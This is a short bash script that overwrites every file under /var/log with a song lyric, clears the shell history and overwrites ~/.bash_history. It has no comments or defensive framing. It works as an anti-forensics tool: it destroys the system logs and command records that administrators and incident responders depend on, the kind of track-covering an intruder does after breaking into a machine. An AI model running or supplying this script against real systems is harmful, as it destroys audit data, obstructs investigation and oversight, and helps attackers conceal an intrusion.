#!/bin/bash
cleaner() {
	find /var/log/ -type f > nlogs
	inpt=nlogs
	while IFS='' read -r line || [[ -n "$line" ]]; do
		echo "I'll be seing you... In all the old famililiar places..." > $line
	done < "$inpt"
	rm -rf nlogs
	
	history -c
	
	echo "I'll be seing you... In all the old famililiar places..." > ~/.bash_history
}

cleaner